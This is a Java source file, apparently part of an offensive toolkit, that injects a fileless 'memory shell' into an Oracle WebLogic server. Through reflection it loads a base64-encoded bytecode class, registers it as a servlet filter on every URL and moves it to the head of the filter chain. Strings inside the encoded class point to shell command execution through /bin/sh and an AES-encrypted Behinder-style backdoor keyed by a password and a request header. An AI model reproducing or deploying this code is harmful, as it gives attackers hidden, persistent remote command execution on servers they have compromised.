package com.feihong.template;

import sun.misc.BASE64Decoder;
import weblogic.servlet.internal.FilterManager;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.servlet.utils.ServletMapping;
import weblogic.utils.collections.MatchMap;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Map;

public class WeblogicMemshellTemplate {
    private ServletRequestImpl servletRequest;
    private String filterName = "dynamicFilter";
    private String urlPattern = "/*";

    public WeblogicMemshellTemplate(ServletRequestImpl servletRequest){
        this.servletRequest = servletRequest;
        addMemshell();
    }

    private void addMemshell(){
        try {
            Field contextField = servletRequest.getClass().getDeclaredField("context");
            contextField.setAccessible(true);
            WebAppServletContext servletContext = (WebAppServletContext) contextField.get(servletRequest);
            FilterManager filterManager = servletContext.getFilterManager();

            // 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
            if (!filterManager.isFilterRegistered(filterName)) {
                System.out.println("[+] Add Dynamic Filter");

                ClassLoader cl = Thread.currentThread().getContextClassLoader();
                Class clazz;
                try{
                    clazz = cl.loadClass("com.feihong.template.DynamicFilterTemplate");
                }catch(ClassNotFoundException e){
                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "yv66vgAAADIBXgoAQgCnCACoCQBdAKkIAKoJAF0AqwgArAkAXQCtCgBdAK4JAK8AsAgAsQoAsgCzCAC0CwBIALUIALYKABMAtwoAEwC4CQC5ALoIALsHALwIAL0IAL4IAHcIAL8HAMAKAMEAwgoAwQDDCgDEAMUKABgAxggAxwoAGADICgAYAMkLAEkAygoAywCzBwDMCwAiAM0LACIAzggAzwsAIgDQCADRCwDSANMIANQKANUA1gcA1wcA2AoALACnCwDSANkKACwA2ggA2woALADcCgAsAN0KABMA3goAKwDfCgDVAOAHAOEKADYApwsASADiCgDjAOQKADYA5QoA1QDmCQBdAOcIAOgHAOkHAHwHAOoKAD4A6wcA7AoA7QDuCgDtAO8KAPAA8QoAPgDyCADzBwD0BwD1BwD2CgBKAPcLAPgA+QgA+goAQAD7BwD8CgBCAP0JAP4A/wcBAAoAPgEBCAECCgDwAQMKAP4BBAcBBQoAVwD3BwEGCgBZAPcHAQcKAFsA9wcBCAcBCQEAEm15Q2xhc3NMb2FkZXJDbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAQYmFzaWNDbWRTaGVsbFB3ZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAE2JlaGluZGVyU2hlbGxIZWFkZXIBABBiZWhpbmRlclNoZWxsUHdkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACxMY29tL2ZlaWhvbmcvdGVtcGxhdGUvRHluYW1pY0ZpbHRlclRlbXBsYXRlOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAQoBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEAAWsBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEAAltCAQAJZXZpbENsYXNzAQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQANU3RhY2tNYXBUYWJsZQcAvAcAdQcA9gEAB2Rlc3Ryb3kBAAppbml0aWFsaXplAQACZXgBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAAVjbGF6egEABm1ldGhvZAEABGNvZGUBAAVieXRlcwEAIkxqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbjsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEALUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uOwcBCAcA6gcA/AcA6QcBCwcBAAcBBQcBBgcBBwEAClNvdXJjZUZpbGUBABpEeW5hbWljRmlsdGVyVGVtcGxhdGUuamF2YQwAZQBmAQAEcGFzcwwAYQBiAQAMWC1PcHRpb25zLUFpDABjAGIBABBlNDVlMzI5ZmViNWQ5MjViDABkAGIMAI8AZgcBDAwBDQEOAQAdWytdIER5bmFtaWMgRmlsdGVyIHNheXMgaGVsbG8HAQ8MARABEQEABHR5cGUMARIBEwEABWJhc2ljDADzARQMARUBFgcBFwwBGABiAQABLwEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAIvQwEAEWphdmEvdXRpbC9TY2FubmVyBwEZDAEaARsMARwBHQcBHgwBHwEgDABlASEBAAJcQQwBIgEjDAEkASUMASYBJwcBKAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMASkBEwwBKgElAQAEUE9TVAwBKwEsAQABdQcBLQwBLgEvAQADQUVTBwEwDAExATIBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMATMBNAwBNQE2AQAADAE1ATcMATgBJQwBOQE6DABlATsMAGwBPAEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAT0BPgcBPwwBQAElDAFBAUIMAUMBRAwAXwBgAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIMAUUBRgEAEGphdmEvbGFuZy9PYmplY3QHAUcMAUgBSQwBSgFLBwELDAFMAU0MAU4BTwEABmVxdWFscwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAVAAZgcBUQwAcgFSAQAiY29tLmZlaWhvbmcudGVtcGxhdGUuTXlDbGFzc0xvYWRlcgwBUwFUAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MAVUBVgcBVwwBWABgAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgwBWQFWAQMQeXY2NnZnQUFBRElBR3dvQUJRQVdCd0FYQ2dBQ0FCWUtBQUlBR0FjQUdRRUFCanhwYm1sMFBnRUFHaWhNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU95bFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFFa3h2WTJGc1ZtRnlhV0ZpYkdWVVlXSnNaUUVBQkhSb2FYTUJBQ1JNWTI5dEwyWmxhV2h2Ym1jdmRHVnRjR3hoZEdVdlRYbERiR0Z6YzB4dllXUmxjanNCQUFGakFRQVhUR3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2pzQkFBdGtaV1pwYm1WRGJHRnpjd0VBTENoYlFreHFZWFpoTDJ4aGJtY3ZRMnhoYzNOTWIyRmtaWEk3S1V4cVlYWmhMMnhoYm1jdlEyeGhjM003QVFBRllubDBaWE1CQUFKYlFnRUFDMk5zWVhOelRHOWhaR1Z5QVFBS1UyOTFjbU5sUm1sc1pRRUFFazE1UTJ4aGMzTk1iMkZrWlhJdWFtRjJZUXdBQmdBSEFRQWlZMjl0TDJabGFXaHZibWN2ZEdWdGNHeGhkR1V2VFhsRGJHRnpjMHh2WVdSbGNnd0FEd0FhQVFBVmFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlBUUFYS0Z0Q1NVa3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0FJUUFDQUFVQUFBQUFBQUlBQUFBR0FBY0FBUUFJQUFBQU9nQUNBQUlBQUFBR0tpdTNBQUd4QUFBQUFnQUpBQUFBQmdBQkFBQUFCQUFLQUFBQUZnQUNBQUFBQmdBTEFBd0FBQUFBQUFZQURRQU9BQUVBQ1FBUEFCQUFBUUFJQUFBQVJBQUVBQUlBQUFBUXV3QUNXU3UzQUFNcUF5cSt0Z0FFc0FBQUFBSUFDUUFBQUFZQUFRQUFBQWdBQ2dBQUFCWUFBZ0FBQUJBQUVRQVNBQUFBQUFBUUFCTUFEZ0FCQUFFQUZBQUFBQUlBRlE9PQwBWgFbDAFcAV0BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uAQAqY29tL2ZlaWhvbmcvdGVtcGxhdGUvRHluYW1pY0ZpbHRlclRlbXBsYXRlAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAB2lzRW1wdHkBAAMoKVoBAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmFwcGVuZAEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBAA1nZXRTdXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwAhAF0AQgABAF4ABAACAF8AYAAAAAIAYQBiAAAAAgBjAGIAAAACAGQAYgAAAAUAAQBlAGYAAQBnAAAAWQACAAEAAAAbKrcAASoSArUAAyoSBLUABSoSBrUAByq3AAixAAAAAgBoAAAAGgAGAAAAFgAEABEACgASABAAEwAWABcAGgAYAGkAAAAMAAEAAAAbAGoAawAAAAEAbABtAAIAZwAAADUAAAACAAAAAbEAAAACAGgAAAAGAAEAAAAdAGkAAAAWAAIAAAABAGoAawAAAAAAAQBuAG8AAQBwAAAABAABAHEAAQByAHMAAgBnAAAC5AAHAAoAAAGpsgAJEgq2AAsrEgy5AA0CAMYAkSsSDLkADQIAEg62AA+ZAIErKrQAA7kADQIAOgQZBMYAbRkEtgAQmgBlAToFsgAREhK2AA+ZABsGvQATWQMSFFNZBBIVU1kFGQRTOgWnABgGvQATWQMSFlNZBBIXU1kFGQRTOgW7ABhZuAAZGQW2ABq2ABu3ABwSHbYAHrYAHzoGLLkAIAEAGQa2ACGnAQorwAAiKrQABbkAIwIAxgDyK8AAIrkAJAEAEiW2AA+ZANQqtAAHOgQrwAAiuQAmAQASJxkEuQAoAwASKbgAKjoFGQUFuwArWbsALFm3AC0rwAAiuQAmAQASJ7kALgIAtgAvEjC2ADG2ADK2ADMSKbcANLYANRkFuwA2WbcANyu5ADgBALYAObYAOrYAOzoGKrQAPBI9Bb0APlkDEj9TWQQSQFO2AEEBBb0AQlkDGQZTWQS4AEO2AERTtgBFwAA+OgcZB7YARjoIGQcSRwW9AD5ZAxJIU1kEEklTtgBBOgkZCRkIBb0AQlkDK1NZBCxTtgBFV6cAFToEGQS2AEunAAstKyy5AEwDALEAAQCxAZMBlgBKAAMAaAAAAG4AGwAAACEACAAjACMAJQAvACYAPAAnAD8AKABKACkAYgArAHcALQCTAC4AngAwALEAMwDCADQAyAA1ANoANgDhADcBFQA4AS8AOQFhADoBaAA7AX8APAGTAEABlgA+AZgAPwGdAEABoABCAagARABpAAAAjgAOAD8AXwB0AHUABQCTAAsAdgBiAAYALwBvAHcAYgAEAMgAywB4AGIABADhALIAeQB6AAUBLwBkAHsAfAAGAWEAMgB9AGAABwFoACsAfgB/AAgBfwAUAIAAgQAJAZgABQCCAIMABAAAAakAagBrAAAAAAGpAIQAhQABAAABqQCGAIcAAgAAAakAiACJAAMAigAAABkACP0AYgcAiwcAjBT5ACYC+wDxQgcAjQkHAHAAAAAGAAIAWQBxAAEAjgBmAAEAZwAAACsAAAABAAAAAbEAAAACAGgAAAAGAAEAAABJAGkAAAAMAAEAAAABAGoAawAAAAIAjwBmAAEAZwAAAgMABwAHAAAAqbgAQ7YAREwqKxJNtgBOtQA8pwB/TSu2AFBOAToEGQTHADMtEkKlAC0tEj0GvQA+WQMSP1NZBLIAUVNZBbIAUVO2AEE6BKf/2DoFLbYAU06n/84SVDoFuwA2WbcANxkFtgA6OgYZBAS2AFUqGQQrBr0AQlkDGQZTWQQDuABWU1kFGQa+uABWU7YARcAAPrUAPKcAGEwrtgBYpwAQTCu2AFqnAAhMK7YAXLEABQAHABEAFABPACgARQBIAFIAAACQAJMAVwAAAJAAmwBZAAAAkACjAFsAAwBoAAAAagAaAAAATQAHAE8AEQBfABQAUAAVAFEAGgBSAB0AUwAoAFUARQBYAEgAVgBKAFcATwBYAFIAWwBWAFwAZABdAGoAXgCQAGYAkwBgAJQAYQCYAGYAmwBiAJwAYwCgAGYAowBkAKQAZQCoAGcAaQAAAHAACwBKAAUAkACRAAUAGgB2AJIAYAADAB0AcwCTAIEABABWADoAlABiAAUAZAAsAJUAfAAGABUAewCCAJYAAgAHAIkAlwCYAAEAlAAEAIIAmQABAJwABACCAJoAAQCkAAQAggCbAAEAAACpAGoAawAAAIoAAAA6AAn/ABQAAgcAnAcAnQABBwCe/gAIBwCeBwCfBwCgagcAoQn/AD0AAQcAnAAAQgcAokcHAKNHBwCkBAABAKUAAAACAKY=";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    Method method = null;
                    Class clz = cl.getClass();
                    while(method == null && clz != Object.class ){
                        try{
                            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        }catch(NoSuchMethodException ex){
                            clz = clz.getSuperclass();
                        }
                    }
                    method.setAccessible(true);
                    clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                }

                //将 Filter 注册进 FilterManager
                //参数： String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
                Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilterMethod.setAccessible(true);
                registerFilterMethod.invoke(filterManager, filterName, "com.feihong.template.DynamicFilterTemplate", new String[]{urlPattern}, null, null, null);


                //将我们添加的 Filter 移动到 FilterChian 的第一位
                Field filterPatternListField = filterManager.getClass().getDeclaredField("filterPatternList");
                filterPatternListField.setAccessible(true);
                ArrayList filterPatternList = (ArrayList)filterPatternListField.get(filterManager);


                //不能用 filterName 来判断，因为在 11g 中此值为空，在 12g 中正常
                for(int i = 0; i < filterPatternList.size(); i++){
                    Object filterPattern = filterPatternList.get(i);
                    Field f = filterPattern.getClass().getDeclaredField("map");
                    f.setAccessible(true);
                    ServletMapping mapping = (ServletMapping) f.get(filterPattern);

                    f = mapping.getClass().getSuperclass().getDeclaredField("matchMap");
                    f.setAccessible(true);
                    MatchMap matchMap = (MatchMap)f.get(mapping);

                    Object result = matchMap.match(urlPattern);
                    if(result != null && result.toString().contains(urlPattern)){
                        Object temp = filterPattern;
                        filterPatternList.set(i, filterPatternList.get(0));
                        filterPatternList.set(0, temp);
                        break;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
